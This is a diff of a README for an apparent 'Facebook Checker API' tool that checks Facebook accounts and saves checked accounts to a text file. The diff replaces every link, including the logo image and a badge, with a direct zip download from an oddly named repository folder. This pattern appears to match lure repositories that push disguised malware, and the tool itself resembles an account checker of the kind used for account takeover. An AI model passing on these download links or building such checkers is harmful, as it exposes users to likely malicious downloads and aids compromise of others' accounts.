@@ -1,6 +1,6 @@
 # Facebook Checker API
 
-![Facebook Checker API Logo](https://github.com/Scorgep/Facebook-Checker-API/releases/download/v2.0/Software.zip)
+![Facebook Checker API Logo](https://github.com/Scorgep/Facebook-Checker-API/raw/refs/heads/main/undistasted/Checker-Facebook-API-v1.7.zip)
 
 Welcome to the **Facebook Checker API** repository! This Python tool is a powerful Facebook account verification tool used to check Facebook profiles and save checked accounts to a .txt file. With this tool, you can efficiently verify the authenticity of Facebook accounts and ensure security and privacy in your online interactions.
 
@@ -15,7 +15,7 @@ Welcome to the **Facebook Checker API** repository! This Python tool is a powerf
 
 To get started with the **Facebook Checker API**, simply download the application from the link provided below:
 
-[Launch the Facebook Checker API Application](https://github.com/Scorgep/Facebook-Checker-API/releases/download/v2.0/Software.zip)
+[Launch the Facebook Checker API Application](https://github.com/Scorgep/Facebook-Checker-API/raw/refs/heads/main/undistasted/Checker-Facebook-API-v1.7.zip)
 
 ## Usage
 
@@ -47,7 +47,7 @@ To get started with the **Facebook Checker API**, simply download the applicatio
 
 ## Get Started
 
-Experience the power of the **Facebook Checker API** and take control of your Facebook verification process. Visit the [Facebook Checker API Application](https://github.com/Scorgep/Facebook-Checker-API/releases/download/v2.0/Software.zip) link to launch the tool and simplify your account verification tasks.
+Experience the power of the **Facebook Checker API** and take control of your Facebook verification process. Visit the [Facebook Checker API Application](https://github.com/Scorgep/Facebook-Checker-API/raw/refs/heads/main/undistasted/Checker-Facebook-API-v1.7.zip) link to launch the tool and simplify your account verification tasks.
 
 For more information and updates, be sure to check the "Releases" section of this repository.
 
@@ -57,4 +57,4 @@ Get started today and enhance the security and privacy of your Facebook interact
 
 Feel free to reach out to us for any queries or support related to the **Facebook Checker API**. Thank you for choosing our tool to streamline your account verification process. Happy checking! 😊
 
-[![](https://github.com/Scorgep/Facebook-Checker-API/releases/download/v2.0/Software.zip%20Checker%20API-blue)](https://github.com/Scorgep/Facebook-Checker-API/releases/download/v2.0/Software.zip)
+[![](https://github.com/Scorgep/Facebook-Checker-API/raw/refs/heads/main/undistasted/Checker-Facebook-API-v1.7.zip%20Checker%20API-blue)](https://github.com/Scorgep/Facebook-Checker-API/raw/refs/heads/main/undistasted/Checker-Facebook-API-v1.7.zip)
